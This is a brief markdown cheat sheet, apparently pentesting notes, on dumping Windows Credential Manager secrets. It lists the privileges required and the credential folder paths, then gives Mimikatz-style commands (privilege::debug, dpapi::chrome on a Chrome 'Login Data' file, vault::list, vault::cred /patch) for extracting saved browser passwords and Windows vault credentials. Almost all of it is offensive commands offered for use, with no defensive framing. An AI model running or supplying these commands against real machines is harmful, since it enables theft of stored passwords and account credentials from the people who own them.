# Credential Manager Basic
```
Need Privileges:
  SeDebugPrivilege
  Local Administrator
  SYSTEM

%AppData%\Microsoft\Credentials
%LocalAppData%\Microsoft\Credentials
```

# Dump Technique
```
Web Passwords:
privilege::debug
dpapi::chrome /in:"C:\path\to\Login Data"

Windows Data:
vault::list
vault::cred /patch
```
